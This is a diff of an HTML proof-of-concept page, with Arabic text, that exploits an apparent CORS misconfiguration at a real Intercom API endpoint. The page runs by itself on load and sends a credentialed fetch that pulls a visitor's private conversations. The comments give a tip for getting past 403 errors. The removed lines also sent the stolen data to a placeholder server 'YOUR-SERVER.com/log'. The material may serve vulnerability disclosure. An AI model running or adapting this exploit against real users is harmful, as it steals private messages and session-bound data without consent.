@@ -1,47 +1,65 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-  <title>CORS PoC Test</title>
+    <meta charset="UTF-8">
+    <title>إثبات ثغرة CORS - تسريب بيانات Intercom</title>
+    <style>
+        body { font-family: sans-serif; direction: rtl; padding: 50px; background-color: #f5f5f5; }
+        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 800px; margin: auto; }
+        h1 { color: #e74c3c; }
+        #status { font-weight: bold; margin: 20px 0; color: #555; }
+        pre { background: #2c3e50; color: #ecf0f1; padding: 20px; border-radius: 5px; overflow-x: auto; text-align: left; direction: ltr; }
+        .success { color: #27ae60; border: 2px solid #27ae60; padding: 10px; border-radius: 5px; }
+    </style>
 </head>
-
 <body>
-  <h2>Testing CORS...</h2>
-  <pre id="output">Waiting...</pre>
 
-  <script>
+<div class="card">
+    <h1>تنبيه: تم كشف ثغرة CORS Misconfiguration</h1>
+    <p>هذه الصفحة تحاول سحب محادثاتك الخاصة من Intercom لإثبات ضعف الإعدادات.</p>
+    
+    <div id="status">جاري إرسال الطلب...</div>
+    <pre id="output">في انتظار البيانات...</pre>
+</div>
+
+<script>
     async function exploit() {
-      const output = document.getElementById("output");
+        // الرابط الذي وجدته في Burp Suite
+        const targetUrl = "https://api-iam.intercom.io/messenger/web/conversations/215474041396551";
+        const statusDiv = document.getElementById('status');
+        const outputPre = document.getElementById('output');
 
-      try {
-        const response = await fetch(
-          "https://api-iam.intercom.io/messenger/web/conversations/215474041396551",
-          {
-            method: "GET",
-            credentials: "include"
-          }
-        );
+        try {
+            const response = await fetch(targetUrl, {
+                method: "GET",
+                mode: "cors",
+                credentials: "include", // هذا هو الجزء الأخطر الذي يسمح بسحب الكوكيز
+                headers: {
+                    "Accept": "*/*",
+                    // ملاحظة: إذا استمر الـ 403، جرب حذف الترويسة التالية
+                    "X-Intercom-App": "ineyz1by" 
+                }
+            });
 
-        const data = await response.text();
-
-        // عرض النتيجة
-        output.textContent = data;
-
-        // محاولة إرسال البيانات لسيرفر خارجي (اختياري)
-        await fetch("https://YOUR-SERVER.com/log", {
-          method: "POST",
-          headers: {
-            "Content-Type": "text/plain"
-          },
-          body: data
-        });
-
-      } catch (error) {
-        output.textContent = "Error: " + error;
-        console.error("CORS/Fetch error:", error);
-      }
+            if (response.ok) {
+                const data = await response.json();
+                statusDiv.innerHTML = "<div class='success'>✅ تم سحب البيانات بنجاح! السيرفر مصاب.</div>";
+                outputPre.textContent = JSON.stringify(data, null, 4);
+            } else if (response.status === 403) {
+                statusDiv.innerHTML = "❌ خطأ 403: السيرفر استلم الطلب لكن الجلسة غير صالحة أو ينقص ترويسة User-Data.";
+                outputPre.textContent = "الاستجابة: Forbidden";
+            } else {
+                statusDiv.innerHTML = "❌ فشل الطلب: كود الحالة " + response.status;
+            }
+        } catch (err) {
+            statusDiv.innerHTML = "❌ خطأ في الاتصال: قد يكون المتصفح حظر الطلب (CORS Blocked).";
+            outputPre.textContent = err.toString();
+        }
     }
 
+    // تشغيل الهجوم
     exploit();
-  </script>
+</script>
+
 </body>
 </html>
